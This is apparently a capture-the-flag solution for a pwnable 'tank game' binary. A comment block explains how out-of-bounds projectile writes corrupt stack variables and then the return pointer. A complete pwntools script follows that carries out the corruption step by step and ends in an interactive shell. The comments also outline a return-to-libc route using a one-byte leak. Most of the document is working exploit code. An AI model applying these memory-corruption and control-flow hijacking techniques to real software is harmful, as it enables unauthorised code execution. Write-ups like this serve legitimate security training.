#this challenge is a pwnable where you play a "tank game". the player controls two float parameters: the angle and power of a "bullet". these values are constrained to be between 0-33 inclusive for power, and 0-90 inclusive for angle. the power value is interpreted as meters per second in a simple calculation for determining the trajectory of the projectile, which will "land" somewhere within an array of size 112, overwriting that index with the "ammo type". using the max power with an angle of 45 will land at index 111, overwriting the null pointer at the end of the string but not actually allowing for any actual memory corruption. Pretty much all variables in this game that SHOULD be constants are instead stack variables. By default, players only have the default ammo type of "". on hitting 3 enemies in a row, players will start earning "specialty ammo", "-". Specialty ammo lands in a "splash", meaning it overwrites the target byte as well as an additional byte at both target + 1 and target - 1. the variable controlling max projectile power is on the stack as the next variable after the "field" that players are firing projectiles into, i.e. overwriting field[112] (one index past what is possible with conventional ammo) will start overwriting the max_power integer. by firing specialty ammo at field[111] the splash will overwrite the least significant byte of max_power, increasing max power to ord("-") (45). this extra range can then be used to overwrite the rest of the integer. A similar trick can be used to overwrite the "max_angle" value which is currently 90, by firing a shot with specialty ammo at field[0]. this overwrites the most significant byte of angle, and lets you set angles >90, allowing you to fire "backwards". with both extra power and the ability to fire backwards, you can now overwrite the max_misses counter to essentially give yourself unlimited lives, as each time you overwrite memory it registers as a "miss" and removes one of your five lives. Next value to overwrite is the "num_ammo_types" integer, which will allow you to index past the "-" ammo type selection. any ammo type that is not "-" is treated like a "", i.e. a single byte overwrite. you can load arbitrary bytes into memory by "failing" the first strcmp check for "pew!" and instead sending "AAAAAA" + 1 arbitrary byte. When you send "pew!" in the next iteration of the loop, the first 6 as are overwritten by "pew!\n\x00" but the last byte remains in memory for the next round's ammo type selection. alternatively, there are a number of values on the stack that increment/decrement each turn, most of which can be used as your new ammo type. regardless of how you acquire the bytes, they can then be shot onto the return pointer. after that you just need to end the game by running out of lives, at which point if you modify the return pointer to point at the free shell function which will just drop you into a shell. Alternatively, if the free shell function were missing, players now essentially have a 1-byte read primitive by selecting some arbitrary memory index and firing it into one of the strings that are printed as part of the UI. this can be used to leak a libc address, and the libc version can be provided for a classic return2libc exploit.

from pwn import *
from time import sleep

def calculateRequiredPowerForDest(target, desired_angle):
    return (((sqrt((target + 0.5)) * sqrt(9.81))) / sqrt(sin(2 * ((pi * desired_angle) / 180))))

def calculateProjectileLandingPoint(v0, theta):
    g = 9.81

    thetaRad = theta * pi / 180.0

    vx = v0 * cos(thetaRad)
    vy = v0 * sin(thetaRad)

    t = (2.0 * vy) / g

    x = vx * t
    return x

def fire_shot(p, power, angle, ammo_type = 1, load_byte=b'A'):
    print("input: power {}, angle {} ammo_type {}".format(power, angle, ammo_type))
    first_line = p.recvline()
    if first_line == b"Hit Streak! 1 specialty ammo granted\n":
        first_line = p.recvline()
        print("+1 specialty ammo")

    if first_line == b"Select ammo type:\n":
        p.recvline() # 1: _
        p.recvline() # 2: - 
        p.sendline(bytes(str(ammo_type), "UTF-8"))
        p.recvline() # Enter power: 
    
    p.sendline(bytes(str(power), "UTF-8"))
    p.recvline() # Enter angle:
    p.sendline(bytes(str(angle), "UTF-8"))

    p.recvline() # Projectile will land at... 
    p.recvline() # fire when ready!
    p.sendline(b"pew!AA" + load_byte)
    p.sendline(b"pew!")
    p.recvline() # Direct hit!
    p.recvline() # \n

    
def parse_ui(p):

    main_ui = p.recvuntil(bytes("|100m\n", "UTF-8"))
    field = main_ui.split(b"\n")[3][9:]
    return field.index(b'E')

    
def shoot_enemy(p, times):
    for i in range(times):
        target = parse_ui(p)
        required_power = calculateRequiredPowerForDest(target, 45)
        fire_shot(p, required_power, 45, 1)

# p = remote('localhost', 1234)
p = process('super-sick-tank-game')
max_angle_off = -0x4
max_power_off = 0x70


# welcome line
p.recvline()

# build up some special ammo
shoot_enemy(p, 10)

# overwrite angle to shoot backwards
parse_ui(p)
fire_shot(p, 0, 0, 2)

# overwrite 1 byte of power to shoot further
parse_ui(p)
fire_shot(p, int(calculateRequiredPowerForDest(max_power_off, 45)), 45, 2)

# overwrite the rest of max_power to shoot past 45
# we don't need THAT much health so just overwrite the least significant byte
parse_ui(p)
fire_shot(p, calculateRequiredPowerForDest(max_power_off + 2, 45), 45, 2)

# overwrite max_misses to increase health by '_'
parse_ui(p)
fire_shot(p, calculateRequiredPowerForDest(0x11c, 45), 135, 1)

# overwrite most significant byte of num_ammo_types so we can use pretty much anything above it on the stack as "ammo"
# also load in the 2nd LSB for the return pointer for next round
parse_ui(p)
fire_shot(p, calculateRequiredPowerForDest(0x115, 45), 135, 1, b'\xe6')

# free shell function LSB
# also load in the LSB for the return pointer for next round
parse_ui(p)
fire_shot(p, calculateRequiredPowerForDest(0x90, 45), 45, 9, b'\x13')

# free shell function second LSB
parse_ui(p)
fire_shot(p, calculateRequiredPowerForDest(0x91, 45), 45, 9)

# use up all the remaining lives. can technically just set remaining lives to 0 but i'm way too lazy
for i in range(87):
    parse_ui(p)
    fire_shot(p, 0, 45, 1)

# gdb.attach(p)
p.interactive()
